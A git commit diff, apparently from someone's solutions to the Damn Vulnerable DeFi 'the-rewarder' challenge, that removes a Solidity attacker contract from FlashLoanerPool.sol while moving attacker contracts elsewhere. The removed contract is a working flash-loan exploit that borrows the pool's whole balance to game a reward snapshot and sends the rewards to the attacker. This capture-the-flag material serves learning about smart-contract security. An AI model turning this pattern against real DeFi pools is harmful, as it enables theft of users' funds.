136123429e4bd43343204a0d56ff6aa68c658162
albertolalanda <lalanda.alberto@gmail.com>
2022-06-27 17:56:13 +0100

    Attacker contracts to respective folder

--- contracts/the-rewarder/FlashLoanerPool.sol
+++ contracts/the-rewarder/FlashLoanerPool.sol
@@ -41,38 +41,3 @@ contract FlashLoanerPool is ReentrancyGuard {
     }
 }
 
-import "./TheRewarderPool.sol";
-import "./RewardToken.sol";
-
-contract HackReward {
-    FlashLoanerPool public pool;
-    DamnValuableToken public token;
-    TheRewarderPool public rewardPool;
-    RewardToken public reward;
-
-    constructor(address _pool, address _token, address _rewardPool, address _reward) {
-        pool = FlashLoanerPool(_pool);
-        token = DamnValuableToken(_token);
-        rewardPool = TheRewarderPool(_rewardPool);
-        reward = RewardToken(_reward);
-    }
-
-    fallback() external {
-        // STEP 2 - Deposit the flashloan to hopefully get the snapshot taken 
-        uint bal = token.balanceOf(address(this));
-
-        token.approve(address(rewardPool), bal);
-        rewardPool.deposit(bal);
-        rewardPool.withdraw(bal);
-
-        token.transfer(address(pool), bal);
-    }
-
-    /** EXPLOIT - If we have a huge number of tokens deposited */
-    function attack() external {
-        // STEP 1 - flash loan the token balance
-        pool.flashLoan(token.balanceOf(address(pool)));
-        // STEP 3 - transfer the reward tokens distributed on the snapshot, to the attacker
-        reward.transfer(msg.sender, reward.balanceOf(address(this)));
-    }
-}
